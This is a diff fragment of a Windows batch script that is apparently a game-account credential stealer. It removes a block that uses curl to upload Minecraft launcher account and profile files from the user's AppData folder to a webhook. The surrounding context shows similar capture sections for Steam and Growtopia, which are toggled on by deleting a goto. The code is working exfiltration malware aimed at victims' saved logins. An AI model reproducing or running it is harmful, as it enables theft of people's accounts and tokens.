@@ -224,16 +224,6 @@ for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
 )
 :skipsteam
 
-:: MINECRAFT - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ---------------------------------------------------------
-goto skipminecraft
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
-	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
-	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
-	
-	timeout /t 2 /nobreak > NUL
-:skipminecraft
-
 :: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ---------------------------------------------------------
 goto skipgrowtopia
